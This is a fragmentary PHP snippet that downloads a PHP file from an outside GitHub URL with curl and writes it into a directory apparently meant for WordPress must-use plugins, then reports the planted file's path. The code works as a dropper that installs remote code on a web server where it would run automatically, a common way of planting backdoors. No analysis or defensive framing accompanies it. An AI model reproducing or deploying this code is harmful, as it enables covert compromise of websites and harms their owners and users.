...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://raw.githubusercontent.com/cantulope/cantutag/refs/heads/main/v4/open_estate_date.php');
...
die('err dir'); }
if (is_file($mu.'open_estate_date.php')) die('file exist');
$r = file_put_contents($mu.'open_estate_date.php', $c);
if ($r===false) die('err saving');
die('/open_estate_date.php');